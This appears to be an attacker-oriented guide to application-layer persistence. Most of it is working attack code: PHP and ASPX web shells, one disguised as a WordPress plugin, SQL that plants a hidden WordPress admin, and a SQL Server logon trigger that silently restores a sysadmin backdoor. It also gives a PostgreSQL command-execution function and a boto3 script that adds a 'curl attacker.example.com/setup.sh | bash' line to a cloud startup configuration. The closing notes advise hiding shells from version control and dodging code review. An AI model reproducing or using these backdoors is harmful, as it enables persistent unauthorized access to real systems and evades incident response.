# Application-layer backdoors

Application-layer persistence survives OS-level incident response. If the application
is redeployed from an unchanged repository or backup, the backdoor comes back with it.
The persistence lives in the application's code, configuration, or data store, not in
the operating system.

## Web shells

A web shell is a script placed in a web-accessible directory that executes attacker-supplied commands via HTTP 
requests. It provides persistent access through the web server's execution context.

```
<?php
// minimal PHP web shell
// place in a web-accessible directory with a plausible name (e.g. health-check.php)
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
    echo '<pre>' . htmlspecialchars($output) . '</pre>';
}
?>
```

For stealth, disguise as a legitimate file:

```
<?php
// disguised as a WordPress plugin update check
// actual content: executes commands from a parameter, only if a secret token is present
$token = 'a3f8b2e1d4c7';
if (isset($_POST['_wpnonce']) && hash_equals($token, $_POST['_wpnonce']) && isset($_POST['action'])) {
    echo base64_encode(shell_exec(base64_decode($_POST['action'])));
}
// below: legitimate-looking plugin code to make the file appear normal on inspection
?>
```

For .NET/ASP applications, ASPX shells:

```
<%@ Page Language="C#" %>
<%
if (Request["key"] == "secret123") {
    Response.Write(new System.Diagnostics.Process() {
        StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) {
            RedirectStandardOutput = true, UseShellExecute = false
        }
    }.Start() ? System.IO.File.ReadAllText("NUL") : "");
}
%>
```

## Hidden admin accounts in web applications

Most content management systems, web frameworks, and SaaS-adjacent applications have
a user database. Adding a hidden administrative account provides persistent access
through the application's normal authentication flow.

WordPress:

```
-- add admin user directly to the database (bypasses WordPress UI logging)
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status)
VALUES ('wp-cron-service', MD5('ComplexPass123!'), 'noreply@domain.com', NOW(), 0);

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```

The username `wp-cron-service` resembles a service account rather than a human user
and is less likely to be noticed in a user audit.

## Database triggers and stored procedures

Database persistence executes on data events and may survive application-level
incident response entirely:

```
-- SQL Server: trigger that runs on every login and re-establishes a backdoor account
CREATE TRIGGER trg_security_audit
ON ALL SERVER FOR LOGON
AS BEGIN
    IF NOT EXISTS (SELECT 1 FROM sys.server_principals WHERE name = 'NT SERVICE\WinRM')
    BEGIN
        EXEC('CREATE LOGIN [NT SERVICE\WinRM] FROM WINDOWS')
        EXEC('ALTER SERVER ROLE sysadmin ADD MEMBER [NT SERVICE\WinRM]')
    END
END;
```

The trigger name `trg_security_audit` and the login name `NT SERVICE\WinRM` both
appear legitimate. The trigger fires on every login and silently re-adds the backdoor
account if it was removed.

PostgreSQL persistent function:

```
-- function that can be called to re-establish OS access
-- requires pg_execute_server_program or similar privilege
CREATE OR REPLACE FUNCTION public.system_health_check(cmd text)
RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
    RETURN (SELECT stdout FROM pg_catalog.pg_execute(cmd));
END;
$$;
-- callable via: SELECT public.system_health_check('id');
```

## Backdoored update mechanisms

If an application has an auto-update mechanism that pulls from a controllable source,
placing a malicious update provides persistent code execution on every update cycle.

Package repositories (if the attacker controls a package source or can perform a
supply chain compromise):

```text
# if the application uses pip with a private package index:
# place a modified version of a dependency on the private index
# the modified version performs the legitimate function and also calls home

# if the application uses npm with a .npmrc pointing to a private registry:
# publish a modified version of a dependency to the private registry
```

Configuration management: applications that pull configuration from a central store
(Consul, etcd, AWS Parameter Store) on startup can be backdoored by modifying the
configuration value. The modification survives any host-level incident response and
affects all instances.

```python
# modify a startup configuration value in AWS Parameter Store
import boto3

ssm = boto3.client('ssm')
# add a malicious startup command to a configuration parameter the application reads
current = ssm.get_parameter(Name='/app/startup-hooks', WithDecryption=True)['Parameter']['Value']
modified = current + '\ncurl -s https://attacker.example.com/setup.sh | bash &'
ssm.put_parameter(Name='/app/startup-hooks', Value=modified, Type='SecureString', Overwrite=True)
```

## Operational notes

Application-layer persistence is most valuable when:

- The application is redeployed regularly (the backdoor comes back automatically)
- The application has network access to systems the OS-level implant cannot reach
- The application runs with elevated database or API credentials

The main risk is that application code changes are reviewed. A web shell added to
a directory that is not under version control (upload directories, cache directories,
temp directories) will not appear in source control diffs. A trigger added directly
to the database will not appear in application code reviews.

For persistence that truly resists code review: prefer mechanisms in the data layer
(triggers, stored procedures, database users) over the application layer.
